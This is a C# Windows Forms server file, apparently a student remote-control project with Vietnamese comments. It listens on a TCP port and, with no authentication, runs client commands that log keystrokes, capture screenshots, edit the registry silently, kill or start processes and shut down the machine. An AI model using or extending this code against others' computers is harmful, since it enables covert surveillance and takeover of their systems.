using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using KeyLogger;
using System.Threading;
using System.IO;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;

namespace server
{
    public partial class server : Form
    {
        public server()
        {
            InitializeComponent();
           
        }
        public void receiveSignal(ref String s)
        {
            try
            {
                s=Program.nr.ReadLine();
            }
            catch (Exception ex)
            {
                s = "QUIT";
            }
        }
        public void shutdown()
        {
            System.Diagnostics.Process.Start("ShutDown", "-s");
        }
        public RegistryKey baseRegistryKey(ref String link)
        {
            RegistryKey a = null;
            if (link.IndexOf('\\') >= 0) 
            switch (link.Substring(0,link.IndexOf('\\')).ToUpper())
            {
                case "HKEY_CLASSIES_ROOT": a = Registry.ClassesRoot; break;
                case "HKEY_CURRENT_USER": a = Registry.CurrentUser; break;
                case "HKEY_LOCAL_MACHINE": a = Registry.LocalMachine; break;
                case "HKEY_USERS": a = Registry.Users; break;
                case "HKEY_CURRENT_CONFIG": a = Registry.CurrentConfig; break;
            }
            return a;
        }

        public String getvalue(ref RegistryKey a,ref String link,ref String valueName)
        {
            a=a.OpenSubKey(link);
            if (a == null) return "Lỗi";
            Object op = a.GetValue(valueName);
            if (op != null)
            {
                String s = "";
                if (a.GetValueKind(valueName) == RegistryValueKind.MultiString)
                {
                    String[] ss = (String[])op;

                    for (int i = 0; i < ss.Length; i++)
                        s += ss[i]+" ";
                    
                }
                else
                    if (a.GetValueKind(valueName) == RegistryValueKind.Binary)
                    {
                        Byte[] ss = (Byte[])op;
                        for (int i = 0; i < ss.Length; i++)
                            s += ss[i]+" ";
                    }
                    else s = Convert.ToString(op);
                return s;
            }
            else return "Lỗi";
        }
        public String setvalue(ref RegistryKey a,ref String link, ref String valueName, ref String value, ref String typeValue)
        {
            try
            {
                a = a.OpenSubKey(link, true);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            if (a == null) return "Lỗi";
            RegistryValueKind kind=RegistryValueKind.String;
            switch (typeValue)
            {
                case "String": kind = RegistryValueKind.String; break;
                case "Binary": kind = RegistryValueKind.Binary; break;
                case "DWORD": kind = RegistryValueKind.DWord; break;
                case "QWORD": kind = RegistryValueKind.QWord; break;
                case "Multi-String": kind = RegistryValueKind.MultiString; break;
                case "Expandable String": kind = RegistryValueKind.ExpandString; break;
                default: return "Lỗi";
            }
            Object v=value;
            //Registry.SetValue(link, valueName, v, kind);
            try
            {
                a.SetValue(valueName, v, kind);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            return "Set value thành công";
        }
        public String deletevalue(ref RegistryKey a,ref String link, ref String valueName)
        {
            try
            {
                a = a.OpenSubKey(link, true);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            if (a == null) return "Lỗi";
            bool test = false ;
            a.DeleteValue(valueName,test);
            if (!test)
                return "Xóa value thành công";
            return "Lỗi";

        }
        public String deletekey(ref RegistryKey a, ref String link)
        {
            bool test = false;
            a.DeleteSubKey(link, test);
            if (!test)
                return "Xóa key thành công";
            else return "Lỗi";
        }
        public void registry()
        {
            String s="";
            FileStream fs = new FileStream("fileReg.reg", FileMode.Create);
            fs.Close();

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {

                    case "REG":
                        {
                            Char[] data=new Char[5000];
                            Program.nr.Read(data,0,5000);
                            s = new String(data);
                            StreamWriter fin = new StreamWriter("fileReg.reg");
                            fin.Write(s);
                            fin.Close();
                            s = Application.StartupPath + "\\fileReg.reg";
                            bool test = true;
                            try
                            {
                                Process regeditPro = Process.Start("regedit.exe", "/s " + "\"" + s + "\"");
                                regeditPro.WaitForExit(20);
                            }
                            catch (Exception ex)
                            {
                                test = true;
                            }
                            if (test)
                                Program.nw.WriteLine("Sửa thành công");
                            else Program.nw.WriteLine("Sửa thất bại");
                            Program.nw.Flush();
                            break;
                        }
                    case "QUIT":
                        {
                            return; 
                        }
                    case "SEND":
                        {
                            String option="";
                            String link = "";
                            String valueName = "";
                            String value = "";
                            String typeValue = "";
                            option = Program.nr.ReadLine();
                            link = Program.nr.ReadLine();
                            valueName = Program.nr.ReadLine();
                            value = Program.nr.ReadLine();
                            typeValue = Program.nr.ReadLine();

                            RegistryKey a = baseRegistryKey(ref link);
                            String link2 = link.Substring(link.IndexOf('\\') + 1);
                            if (a == null)
                            s = "Lỗi";
                            else
                            {
                            
                                switch (option)
                                {
                                    case "Create key":{ a=a.CreateSubKey(link2);s="Tạo key thành công";break;}
                                    case "Delete key":s=deletekey(ref a,ref link2);break;
                                    case "Get value": s = getvalue(ref a,ref link2, ref valueName); break;
                                    case "Set value": s = setvalue(ref a,ref link2, ref valueName, ref value, ref typeValue); break;
                                    case "Delete value": s = deletevalue(ref a,ref link2, ref valueName); break;
                                    default: s = "Lỗi"; break;
                                }
                            }
                            Program.nw.WriteLine(s);
                            Program.nw.Flush();
                            break;
                        }
                }   
            }
        }
        public void takepic()
        {
            String ss="";
            
            while (true)
            {
                receiveSignal(ref ss);
                switch(ss)
                {
                    case "TAKE":
                        {
                            Bitmap bmpScreenshot;
                            Graphics gfxScreenshot;
                            bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                            // Create a graphics object from the bitmap  
                            gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                            // Take the screenshot from the upper left corner to the right bottom corner  
                            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                            // Save the screenshot to the specified path that the user has chosen  
                           
                            MemoryStream ms = new MemoryStream();
                            bmpScreenshot.Save(ms, ImageFormat.Bmp);
                            ms.Close();

                            String s = Convert.ToString(ms.ToArray().Length);
                            Program.nw.WriteLine(s);Program.nw.Flush();
                            Program.client.Send(ms.ToArray());
                            break;
                        }
                    case "QUIT":
                        {
                            return; break;
                        }
                }
            }
        }
        
        public void hookKey(ref Thread tklog)
        {
            tklog.Resume();
            File.WriteAllText(appstart.path,"");
        }
        public void unhook(ref Thread tklog)
        {
            tklog.Suspend();
        }
        public void printkeys()
        {
            String s = "";
            s = File.ReadAllText(appstart.path);
            File.WriteAllText(appstart.path,"");
            if (s == "")
                s = "\0";
            Program.nw.Write(s); Program.nw.Flush();
        }
       
        public void keylog()
        {
            Thread tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
            String s = "";
            tklog.Start();
            tklog.Suspend();
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "PRINT": printkeys(); break;
                    case "HOOK": hookKey(ref tklog); break;
                    case "UNHOOK": unhook(ref tklog); break;
                    case "QUIT": return;
                }
            }

        }
        public void application() //Đối tượng application (*)
        {
            String ss = ""; //Tạo biến ss và chuẩn hóa chuỗi ss
            System.Diagnostics.Process[] pr; //Khởi chạy hoặc dừng application (*)
            pr = System.Diagnostics.Process.GetProcesses(); //Liên kết các tiến trình trong chương trình
            while (true)
            {
                receiveSignal(ref ss); //ref: lấy giá trị trực tiếp của ss trên RAM để xử lý
                switch (ss) // xét lần lượt các trường hợp của ss
                {
                    case "XEM":
                        {
                            string u = ""; //Tạo biến u và chuẩn hóa chuỗi u
                            string s = "";//Tạo biến s và chuẩn hóa chuỗi s
                            pr = System.Diagnostics.Process.GetProcesses();
                           int soprocess = pr.GetLength(0);// tạo biến soprocess là biến khởi tạo hoặc dừng chương trình với mảng 1 chiều
                            u = soprocess.ToString();//đưa u về dạng chuỗi
                            Program.nw.WriteLine(u);Program.nw.Flush();// Xóa dữ liệu đệm và ghi dữ liệu vào Program.nw ở Program.cs
                            foreach (System.Diagnostics.Process p in pr) //Cho p là một thành phần trong pr
                            {
                                // nếu p >0 thì cửa sổ của sẽ xuất ra màn hình chương trình là ok
                                // nếu u = ok thì u sẽ là cửa sổ của p
                                if (p.MainWindowTitle.Length > 0) Program.nw.WriteLine(p.MainWindowTitle);
                                {

                                    u = "ok"; 

                                }
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                if (u == "ok") //nếu u = ok thì
                                {
                                    u = p.ProcessName; // tên tiến trình của p sẽ là u
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                    u = p.Id.ToString(); // lấy id riêng biệt cho chương trình liên kết
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                    u = p.Threads.Count.ToString(); // lấy tập hợp các thread đang chạy trong chương trình liên kết
                                    // lấy số của phần tử trong System.Collections.ReadCollectionOnlyBase
                                    Program.nw.WriteLine(u); Program.nw.Flush(); // xuất ra màn hình và viết vào chương trình

                                }
                            }
                               
                        }
                        break;
                    case "KILL":
                        {
                            bool test=true;
                            while (test) //Tạo vòng lặp để kiểm tra biến test
                                
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {

                                    case "KILLID": // trường hợp kill
                                        {
                                            string u = "";//Tạo biến s và chuẩn hóa chuỗi s
                                            u = Program.nr.ReadLine(); //nhập vào u 
                                            bool test2 = false; // tạo biến test2 với giá trị là false
                                            if (u != "") //nếu u không là chuỗi thì p sẽ tuần tự xử lý các sự kiện như sau: 
                                                         
                                                         
                                                foreach (System.Diagnostics.Process p in pr) // câu điều kiện duyệt mảng tuần tự, Process p in pr tạo biến local và 1 tiến trình từ xa để kích hoạt chạy hoặc dừng chương trình trong scrips này
                                                    if (p.MainWindowTitle.Length > 0) // điều kiện cửa số chính của chương trình > 0
                                                {
                                                    if (p.Id.ToString() == u) // nếu p là u thì chương trình bị kill thì màn hình sẽ xuất ra thông báo "lỗi" (xử lý ngoại lệ khi chương trình lỗi) => test2 = true
                                                        {
                                                        try
                                                        {
                                                            p.Kill();
                                                            Program.nw.WriteLine("Đã diệt chương trình"); Program.nw.Flush();

                                                        }
                                                        catch (Exception ex)
                                                        { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                                        test2 = true;
                                                    }
                                                }
                                            if (!test2) // nếu test 2 true thì chương trình sẽ xuất ra màn hình là "Không tìm thấy chương trình" và thoát chương trình
                                            { Program.nw.WriteLine("Không tìm thấy chương trình"); Program.nw.Flush(); }
                                            break;
                                        }
                                     case "QUIT": test = false; break; // nếu test = false thì dừng lại

                                }
                            }
                        }
                        break;
                    case "START":
                     {
                            bool test = true;
                            while (test) //Tạo vòng lặp để kiểm tra biến test
                            {
                                receiveSignal(ref ss);
                                switch (ss) 
                                {
                                    case "STARTID": // trường hợp STARTID
                                        {
                                            String u = ""; // Tạo biến s và chuẩn hóa chuỗi s
                                            u = Program.nr.ReadLine();//nhập vào u 
                                            if (u != "") // nếu u nhập vào không là một chuỗi được chuẩn hóa thì u sẽ = u nhập vào +.exe
                                            {
                                                u += ".exe";
                                                //System.Diagnostics.Process t= new Process();
                                                try
                                                {
                                                    Process.Start(u);
                                                    Program.nw.WriteLine("Chương trình đã được bật"); Program.nw.Flush();
                                                }
                                                catch (Exception ex)
                                                {
                                                    Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                                }
                                                break;
                                                //p.Start();
                                            }
                                            Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                            break;
                                        }
                                    case "QUIT": test = false; break;
                                }

                            }
                        }
                        break;
                    case "QUIT":
                        {
                            return;
                        }

                }
            }

        }
        public void process()
        {
            String ss = "";
            System.Diagnostics.Process[] pr;
            pr = System.Diagnostics.Process.GetProcesses();
            while (true)
            {
                receiveSignal(ref ss);

                switch (ss)
                {
                    case "XEM":
                        {
                            string u = "";
                            string s = "";
                            pr = System.Diagnostics.Process.GetProcesses();
                            int soprocess = pr.GetLength(0);
                            u = soprocess.ToString();
                            Program.nw.WriteLine(u); Program.nw.Flush();
                            foreach (System.Diagnostics.Process p in pr)
                            {
                                u = p.ProcessName;
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                u = p.Id.ToString();
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                u = p.Threads.Count.ToString();
                                Program.nw.WriteLine(u); Program.nw.Flush();

                            }
                        }
                        break;
                    case "KILL":
                        {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {

                                    case "KILLID":
                                        {
                                            string u = "";
                                            u = Program.nr.ReadLine();
                                            bool test2 = false;
                                            if (u != "")
                                                foreach (System.Diagnostics.Process p in pr)
                                                {
                                                    if (p.Id.ToString() == u)
                                                    {
                                                        try
                                                        {
                                                            p.Kill();
                                                            Program.nw.WriteLine("Đã diệt process"); Program.nw.Flush();

                                                        }
                                                        catch (Exception ex)
                                                        { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                                        test2 = true;
                                                    }
                                                }
                                            if (!test2)
                                            { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                            break;
                                        }
                                    case "QUIT": test = false; break;

                                }
                            }
                        }
                        break;
                    case "START":
                        {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {
                                    case "STARTID":
                                        {
                                            String u = "";
                                            u = Program.nr.ReadLine();
                                            if (u != "")
                                            {
                                                u += ".exe";
                                                //System.Diagnostics.Process t= new Process();
                                                try
                                                {
                                                    Process.Start(u);
                                                    Program.nw.WriteLine("Process đã được bật"); Program.nw.Flush();
                                                }
                                                catch (Exception ex)
                                                {
                                                    Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                                }
                                                break;
                                                //p.Start();
                                            }
                                            Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                            break;
                                        }
                                    case "QUIT": test = false; break;
                                }

                            }
                        }
                        break;
                    case "QUIT":
                        {
                            return; break;
                        }
                }
            }

        }
        private void button1_Click(object sender, EventArgs e)
        {
            IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
            Program.server=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
            Program.server.Bind(ip);
            Program.server.Listen(100);
            Program.client = Program.server.Accept();
            Program.ns = new NetworkStream(Program.client);
            Program.nr = new StreamReader(Program.ns);
            Program.nw = new StreamWriter(Program.ns);
            String s="";
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "KEYLOG": keylog(); break;
                    case "SHUTDOWN": shutdown(); break;
                    case "REGISTRY": registry(); break;
                    case "TAKEPIC": takepic(); break;
                    case "PROCESS": process(); break;
                    case "APPLICATION": application(); break;
                    case "QUIT":goto finish;
                     
                }
            }
        finish:
           
            Program.client.Shutdown(SocketShutdown.Both);
            Program.client.Close();
            Program.server.Close();
        }
    }
}
